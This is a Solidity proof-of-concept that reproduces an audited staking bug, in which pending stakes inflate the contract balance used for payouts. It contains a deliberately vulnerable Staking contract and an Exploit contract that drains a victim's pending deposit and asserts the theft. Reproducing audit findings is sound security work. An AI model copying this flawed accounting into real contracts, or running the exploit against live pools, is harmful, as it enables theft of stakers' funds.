// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Coinflip finding 55503 (C-02):
// "Pending stake not accounted for in liquidity calculations".
//
// Real audited source (Pashov Audit Group — Coinflip security review, 2025-02-19):
//   report github.com/pashov/audits/blob/master/team/md/Coinflip-security-review_2025-02-19.md
//   contract  Staking
//   functions requestStake / finalizeUnstake (finalizeStake / totalOwed / lockLiquidity
//             are affected by the same root cause)
//
// The vulnerable lines are reproduced VERBATIM from the finding's embedded source
// (marked @>). Root cause: `Staking.requestStake()` moves the staker's tokens into
// the contract IMMEDIATELY (safeTransferFrom) but never records them as a *pending*
// stake to be excluded from available liquidity. Every share / pro-rata calculation
// then uses the raw `IERC20(token).balanceOf(address(this))`, which now includes the
// still-pending tokens. A prior staker who unstakes after a new staker has only
// *requested* (not finalized) a stake is paid a pro-rata slice of the INFLATED
// balance — i.e. they walk away with the pending staker's tokens.
//
// Worked example from the finding (reproduced mechanically below):
//   0. Bob is the sole staker: 100 shares, pool balance 100 tokens (owns 100%).
//   1. Bob requests a full unstake (cooldown already elapsed).
//   2. Alice requestStake(100): her 100 tokens land in the contract, pool -> 200.
//   3. Bob finalizeUnstake: amountOwed = 100 * 200 / 100 = 200 -> takes 100 + Alice's 100.
//   4. Alice finalizes with 100 shares but 0 tokens of backing left.
//
// Non-vulnerable dependencies (ERC20, SafeERC20, cooldown gating, share book-keeping)
// are faithful minimal doubles with real transfers and real accounting — never fake
// constants. Cooldown is set to 0 because timing is not the vulnerable mechanism.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Faithful minimal ERC20 double for the staked asset.
interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

/// @dev Faithful minimal SafeERC20 so the reproduced `safeTransfer[From]` calls are verbatim.
library SafeERC20 {
    function safeTransfer(IERC20 token, address to, uint256 value) internal {
        require(token.transfer(to, value), "SafeERC20: transfer failed");
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint256 value) internal {
        require(token.transferFrom(from, to, value), "SafeERC20: transferFrom failed");
    }
}

/// @dev Faithful ERC20 double for the Coinflip staking asset.
contract MiniToken is IERC20 {
    string public name = "Coinflip Staked Asset";
    string public symbol = "cfSTK";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract — the `requestStake` transfer and the `finalizeUnstake`
// liquidity math are reproduced VERBATIM from the audited Coinflip `Staking`.
// ─────────────────────────────────────────────────────────────────────────────
contract Staking {
    using SafeERC20 for IERC20;

    uint256 public totalShares;
    mapping(address => uint256) public shares;

    struct StakeRequest {
        uint256 amount;
        uint256 requestTime;
        bool active;
    }

    struct UnstakeRequest {
        uint256 shares;
        uint256 requestTime;
        bool active;
    }

    mapping(address => StakeRequest) public stakeRequests;
    mapping(address => UnstakeRequest) public unstakeRequests;

    // Cooldown gating (not the vulnerable mechanism); zero so the worked example
    // is reproducible without time cheatcodes.
    uint256 public constant COOLDOWN = 0;

    event Unstaked(address indexed user, address indexed token, uint256 amount);

    function requestStake(address token, uint256 amount) external {
        // Record the stake request, but NOTE: the tokens are moved in below and are
        // never tracked as a *pending* balance excluded from liquidity.
        stakeRequests[msg.sender] = StakeRequest(amount, block.timestamp, true);

        // Transfer the tokens from the user to this contract
        IERC20(token).safeTransferFrom(msg.sender, address(this), amount); // @> VULN: pending stake tokens enter the pool immediately with no pending-tracking, inflating balanceOf() used by all liquidity math
    }

    function finalizeStake(address token) external {
        StakeRequest memory req = stakeRequests[msg.sender];
        require(req.active, "no stake request");
        require(block.timestamp >= req.requestTime + COOLDOWN, "cooldown");

        uint256 totalBalance = IERC20(token).balanceOf(address(this));
        uint256 sharesToMint;
        if (totalShares == 0) {
            sharesToMint = req.amount;
        } else {
            // totalBalance already contains req.amount (and any OTHER users' pending
            // stakes) — none are excluded, so the share price is wrong.
            sharesToMint = (req.amount * totalShares) / (totalBalance - req.amount);
        }

        shares[msg.sender] += sharesToMint;
        totalShares += sharesToMint;
        delete stakeRequests[msg.sender];
    }

    function requestUnstake(address, /* token */ uint256 shareAmount) external {
        require(shares[msg.sender] >= shareAmount, "insufficient shares");
        unstakeRequests[msg.sender] = UnstakeRequest(shareAmount, block.timestamp, true);
        // shares leave the user but remain counted in totalShares until finalize
        shares[msg.sender] -= shareAmount;
    }

    function finalizeUnstake(address token) external {
        UnstakeRequest memory req = unstakeRequests[msg.sender];
        require(req.active, "no unstake request");
        require(block.timestamp >= req.requestTime + COOLDOWN, "cooldown");
        uint256 sharesToRedeem = req.shares;

        uint256 totalBalance = IERC20(token).balanceOf(address(this)); // includes still-pending stakes (root cause)
        // The user’s pro-rata portion of the underlying tokens
        uint256 amountOwed = (sharesToRedeem * totalBalance) / totalShares;

        totalShares -= sharesToRedeem;
        delete unstakeRequests[msg.sender];

        IERC20(token).safeTransfer(msg.sender, amountOwed);

        emit Unstaked(msg.sender, token, amountOwed);
    }

    /// @notice Also over-estimates liquidity for the same reason (listed by the finding).
    function totalOwed(address token) external view returns (uint256) {
        return IERC20(token).balanceOf(address(this));
    }
}

/// @dev Faithful actor double (Alice) — a distinct address so shares/requests key correctly.
contract Staker {
    function approve(IERC20 token, address spender) external {
        token.approve(spender, type(uint256).max);
    }

    function requestStake(Staking s, address token, uint256 amount) external {
        s.requestStake(token, amount);
    }

    function finalizeStake(Staking s, address token) external {
        s.finalizeStake(token);
    }

    function requestUnstake(Staking s, address token, uint256 shareAmount) external {
        s.requestUnstake(token, shareAmount);
    }

    function finalizeUnstake(Staking s, address token) external {
        s.finalizeUnstake(token);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver — Bob is this contract; Alice is a separate Staker. Bob supplies
// 100e18, queues a full unstake, waits for Alice to REQUEST a 100e18 stake (tokens
// land in the pool), then finalizes his unstake to drain the inflated balance,
// walking away with Alice's 100e18. Alice ends with shares but zero backing.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    MiniToken public token;
    Staking public staking;
    Staker public alice;

    uint256 public bobDeposited;
    uint256 public bobReceived;
    uint256 public aliceDeposited;
    uint256 public aliceRedeemed;
    uint256 public profit;

    uint256 internal constant STAKE = 100e18; // finding's example: 100 tokens each

    constructor() {
        token = new MiniToken(); // child nonce 1 (profit token)
        staking = new Staking(); // child nonce 2 (VULN)
        alice = new Staker(); // child nonce 3
    }

    function run() external {
        address tk = address(token);

        // ── Bob (this contract) becomes the sole existing staker: 100e18 shares, pool 100e18 ──
        token.mint(address(this), STAKE);
        token.approve(address(staking), type(uint256).max);
        bobDeposited = STAKE;
        staking.requestStake(tk, STAKE); // pool balance -> 100e18
        staking.finalizeStake(tk); // totalShares 0 -> Bob minted 100e18 shares

        // Bob queues a full unstake (cooldown already elapsed / zero)
        staking.requestUnstake(tk, STAKE); // shares -> pending; totalShares unchanged

        // ── Alice only *requests* a stake: her 100e18 lands in the pool immediately ──
        token.mint(address(alice), STAKE);
        aliceDeposited = STAKE;
        alice.approve(IERC20(tk), address(staking));
        alice.requestStake(staking, tk, STAKE); // pool balance -> 200e18 (100 of it pending)

        // ── Bob finalizes his unstake: pro-rata over the INFLATED 200e18 balance ──
        uint256 bobBefore = token.balanceOf(address(this));
        staking.finalizeUnstake(tk); // pays 100e18 * 200e18 / 100e18 = 200e18
        bobReceived = token.balanceOf(address(this)) - bobBefore;

        // ── Alice finalizes her stake (mints shares) then tries to redeem: pool is empty ──
        alice.finalizeStake(staking, tk); // Alice minted 100e18 shares, 0 tokens of backing
        alice.requestUnstake(staking, tk, STAKE);
        uint256 aliceBefore = token.balanceOf(address(alice));
        alice.finalizeUnstake(staking, tk); // amountOwed = 100e18 * 0 / totalShares = 0
        aliceRedeemed = token.balanceOf(address(alice)) - aliceBefore;

        // Bob walked away with more than he deposited — the surplus is Alice's stolen stake.
        profit = bobReceived - bobDeposited; // 100e18

        // HARM: prior staker drains a still-pending stake; the pending staker loses all funds.
        require(bobReceived == 2 * STAKE, "bob did not drain the pending stake");
        require(aliceRedeemed == 0, "alice unexpectedly recovered funds");
        require(profit == aliceDeposited, "stolen amount != alice's lost deposit");
    }
}
